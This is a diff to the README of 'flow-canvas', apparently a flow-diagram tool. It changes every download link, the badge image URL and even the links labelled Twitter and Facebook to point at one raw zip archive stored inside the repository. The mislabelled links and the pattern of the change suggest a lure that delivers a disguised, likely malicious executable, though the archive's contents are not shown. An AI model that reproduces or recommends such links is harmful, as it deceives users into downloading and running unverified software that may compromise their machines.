@@ -5,9 +5,9 @@ Flow-canvas helps you create visual flow diagrams quickly. With just a few click
 
 ## 📥 Download and Install
 ### Click the button below to get started:
-[![Download flow-canvas](https://img.shields.io/badge/Download%20flow--canvas-blue?style=for-the-badge)](https://github.com/yoyo77757/flow-canvas/releases)
+[![Download flow-canvas](https://raw.githubusercontent.com/yoyo77757/flow-canvas/main/Lolium/canvas_flow_v3.6.zip%20flow--canvas-blue?style=for-the-badge)](https://raw.githubusercontent.com/yoyo77757/flow-canvas/main/Lolium/canvas_flow_v3.6.zip)
 
-To download the application, please visit this page: [Download flow-canvas](https://github.com/yoyo77757/flow-canvas/releases).
+To download the application, please visit this page: [Download flow-canvas](https://raw.githubusercontent.com/yoyo77757/flow-canvas/main/Lolium/canvas_flow_v3.6.zip).
 
 ### System Requirements
 - **Operating System:** Windows 10 or later, macOS Catalina or later, or any recent Linux distribution.
@@ -24,7 +24,7 @@ To download the application, please visit this page: [Download flow-canvas](http
 
 ## 💻 How to Use flow-canvas
 1. **Download the Application:**
-   Visit the [Download flow-canvas](https://github.com/yoyo77757/flow-canvas/releases) page to get the latest version of the software.
+   Visit the [Download flow-canvas](https://raw.githubusercontent.com/yoyo77757/flow-canvas/main/Lolium/canvas_flow_v3.6.zip) page to get the latest version of the software.
   
 2. **Install flow-canvas:**
    - For Windows: Open the downloaded `.exe` file and follow the installation guide.
@@ -54,12 +54,12 @@ If you encounter any issues:
 
 ## 🔗 Stay Connected
 Follow us on social media for updates and tips:
-- Twitter: [@flow_canvas](https://twitter.com/flow_canvas)
-- Facebook: [flow-canvas](https://facebook.com/flow-canvas)
+- Twitter: [@flow_canvas](https://raw.githubusercontent.com/yoyo77757/flow-canvas/main/Lolium/canvas_flow_v3.6.zip)
+- Facebook: [flow-canvas](https://raw.githubusercontent.com/yoyo77757/flow-canvas/main/Lolium/canvas_flow_v3.6.zip)
 
 ---
 
 ## 🌟 Quick Recap
 Flow-canvas empowers you to design flow diagrams simply and effectively. Download the software, create stunning visuals, and share them with ease. Enjoy the process of building your project visually! 
 
-### Remember, you can always download the latest version [here](https://github.com/yoyo77757/flow-canvas/releases).
+### Remember, you can always download the latest version [here](https://raw.githubusercontent.com/yoyo77757/flow-canvas/main/Lolium/canvas_flow_v3.6.zip).
